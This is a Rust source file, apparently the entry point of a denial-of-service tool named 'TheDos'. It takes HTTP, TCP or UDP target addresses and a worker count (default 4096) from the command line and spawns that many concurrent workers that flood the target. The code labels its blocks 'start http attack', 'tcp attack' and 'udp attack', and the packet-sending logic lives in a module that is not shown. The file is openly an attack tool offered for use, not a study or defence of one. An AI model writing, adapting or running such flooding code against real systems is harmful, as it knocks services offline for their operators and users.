

/*



by



 █     █░ ██▓ ██▓    ▓█████▄  ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▓█░ █ ░█░▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒█░ █ ░█ ▒██▒▒██░    ░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░    ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒░▒████▓ ░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
░ ▓░▒ ▒  ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ▒ ░ ░   ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ░   ▒ ░  ░ ░    ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
    ░     ░      ░  ░   ░        ░ ░           ░  ░      ░ ░           ░ 
                      ░                                                  




*/


use clap::Parser;
use regex::Regex;
use is_type::Is;
use std::future::Future;
use std::thread;
use std::env;
use std::sync::{Arc, Mutex, mpsc as std_mpsc};
use std::process;
use hyper::{Client, Uri, Response, Body, Request};
use serde::{Deserialize, Serialize};
use rand::Rng;
use borsh::{BorshDeserialize, BorshSerialize};
use log4rs::append::console::ConsoleAppender;
use log4rs::config::{Appender, Root};
use log4rs::Config;
use log::{info, error, LevelFilter};
use tokio::net::{TcpListener, TcpStream}; //-- async tcp listener and stream
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use uuid::Uuid;
use std::time::{Instant, Duration};
use crate::scheduler::*;






pub mod onion;
pub mod scheduler;
pub mod actor;






#[derive(Parser, Default, Debug)]
#[clap(about, version, author)]
struct Arguments{
    #[clap(long)]
    pub http_addr: Option<String>, // the default attack
    #[clap(long)]
    pub tcp_addr: Option<String>, // it can be empty on cli
    #[clap(long)]
    pub udp_addr: Option<String>, // it can be empty on cli
    #[clap(long)]
    pub workers: Option<usize>,
}






#[tokio::main(flavor="multi_thread", worker_threads=10)] //// use the tokio multi threaded runtime by spawning 10 threads
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{



    

    // setup logging

    let stdout = ConsoleAppender::builder().build();
    let config = Config::builder()
                                    .appender(Appender::builder().build("stdout", Box::new(stdout)))
                                    .build(Root::builder().appender("stdout").build(LevelFilter::Trace))
                                    .unwrap();
    let _handle = log4rs::init_config(config).unwrap();
    


    
    // cli args parsing 
    
    let arg = Arguments::parse();
    let mut url = arg.http_addr;
    let mut n_workers = arg.workers.unwrap_or(4096);
    let mut tcp_addr = arg.tcp_addr;
    let mut udp_addr = arg.udp_addr;
    let mut workers = Workers::new(n_workers as usize);
    
    

    



    
    //// --------------------- start http attack

    if let Some(mut url) = url{

        let re = Regex::new(r#"\\"(https?\\"://)?([^/]*)/?.*"#).unwrap(); // https://stackoverflow.com/a/54061205
        let url_with_slash = &format!("{}/", url.clone()); // making a longer lifetime of the url which is outside of the following if 
        if !url.ends_with("/"){
            // url = &format!("{}/", url.clone()); // when we initialize a new url with format! it's valid as long as we're inside the if and once we get outta of this scope url will no longer be valid
            url = url_with_slash.to_string();
        } 
    
        let host = if let Some(host) = re.captures(&url){
            Some(host.get(2).unwrap().as_str().to_owned()) // to_owned() will convert the borrowed type to its original type and here in our case is the String itself since also anything in parentheses () inside the defined pattern will be a capture group
        } else{
            Some("".to_string())
        };
        let parsed_url = url.parse::<Uri>().unwrap();
        assert_eq!(parsed_url.scheme_str(), Some("http")); // make sure the http is correct        


        let thedos = onion::TheDos::new(Some(url.clone()), None, None, host.clone()); // pass String by reference convert them to &str automatically

        for p in 0..n_workers{
            let mut thedos = thedos.clone();
            workers.spawn(async move{
                thedos.httpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    
    }



    





    //// --------------------- start tcp attack

    if let Some(_) = tcp_addr{
       
        let thedos = onion::TheDos::new(None, tcp_addr, None, None); // pass String by reference convert them to &str automatically

        for p in 0..n_workers{
            let mut thedos = thedos.clone();
            workers.spawn(async move{
                thedos.tcpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    
    }








    //// --------------------- start udp attack
    
    if let Some(_) = udp_addr{
       
        let thedos = onion::TheDos::new(None, None, udp_addr, None); // pass String by reference convert them to &str automatically
        
        for p in 0..n_workers{
            let mut thedos = thedos.clone();
            workers.spawn(async move{
                thedos.udpcall().await;
                if thedos.flag == 1{
                    info!("-- TheDos Attack Finished --");
                    process::exit(1);
                }
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    
    }

    
            
    workers.run().await // wait for all the workers to complete if there were any



}

